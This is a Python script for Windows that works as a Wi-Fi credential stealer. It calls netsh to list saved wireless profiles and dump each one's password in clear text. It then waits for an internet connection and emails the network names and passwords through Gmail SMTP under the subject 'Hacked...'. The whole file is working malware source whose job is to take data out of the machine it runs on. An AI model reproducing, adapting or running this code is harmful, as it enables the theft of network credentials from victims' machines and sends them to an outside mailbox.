#!/usr/bin/env python
import subprocess
import smtplib
proc = subprocess.Popen('netsh wlan show profiles &', stdout=subprocess.PIPE,shell=True)
tmp=proc.stdout.read()
flag=0
count=0
sr=tmp.replace("\r\n","$")
wrd=""
sent=""
skip=0
for ch in sr:
    if skip==1:
        skip=0
        continue
    if ch==':':
        count=count+1
        flag=1
        skip=1
        continue
    elif ch=='$' and flag==1 and count>1:
        sent+=wrd
        wrd=""
        sent+="*"
        flag=0
    if flag==1 and count>1:
        wrd+=ch
    elif flag==1 and count<=1:
        flag=0
        wrd=""

encoded=sent.replace("* ","$")
details=""
word=""
for ch in encoded:
    if(ch!='*'):
        word+=ch
    else:
        proc = subprocess.Popen('netsh wlan show profiles '+word+' key=clear &', stdout=subprocess.PIPE,shell=True)
        tmp=proc.stdout.read()
        wrd=""
        flag=0
        pwd=""
        skip=0
        for i in tmp:
            if(skip==1):
                skip=0
                continue
            
                
                continue
            if(i==':' and flag==1):
                skip=1
                flag=2
                continue
            if(skip==0 and flag==2):
                pwd+=i
                if(i=='\n'):
                    break
            if(i!=' '):
                wrd+=i
            else:
                if(wrd=="Key"):
                    flag=1
                wrd=""
        l=len(pwd)
        pwd=pwd.strip()
        if(l>3):
            details+=word+" - "+pwd+'\r\n'
           
        word=""
import urllib
while(True):
   try:
        p=urllib.urlopen("http://www.google.com")
        break
   except:
       continue
conn=smtplib.SMTP('smtp.gmail.com',587)
conn.ehlo()
conn.starttls()
conn.login('your-mail@gmail.com','your-password')
conn.sendmail('from-mail@gmail.com','to-mail@gmail.com','Subject: Hacked...\n\n'+details)
conn.quit()
                    
            
                
            

        
        

    
        
    
    
